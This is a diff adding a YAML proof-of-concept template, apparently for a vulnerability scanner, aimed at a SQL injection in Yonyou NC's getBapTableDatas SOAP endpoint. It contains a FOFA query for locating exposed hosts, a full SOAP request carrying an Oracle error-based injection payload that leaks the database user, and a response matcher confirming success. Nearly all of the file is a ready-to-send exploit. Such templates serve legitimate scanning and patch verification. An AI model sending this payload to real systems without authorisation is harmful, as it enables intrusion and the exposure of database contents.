@@ -1,0 +1,24 @@
+id: poc-yaml-yongyou-nc-getbaptabledatas-sqli
+info:
+  name: 用友NC getBapTableDatas SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: POST
+  path: /uapws/service/nc.itf.bap.service.IBapIOService
+  headers:
+    Content-Type: text/xml
+  data: "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<soapenv:Envelope\
+    \ xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:gs=\"http://service.bap.itf.nc/IBapIOService\"\
+    >\n    <soapenv:Header/>\n    <soapenv:Body>\n        <gs:getBapTableDatas>\n\
+    \            <gs:stringarrayItem>DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'||(user)||'~')--\
+    \ abc\n</gs:stringarrayItem>\n        </gs:getBapTableDatas>\n    </soapenv:Body>\n\
+    </soapenv:Envelope>"
+  expression: status_code == 500 && contains(body,"未知的主机") && contains(body,"SYS.UTL_INADDR")
+    && matches(body,`~([0-9A-Za-z]+)~`) && contains(content_type,"text/xml")
+variables: {}
+transport: http
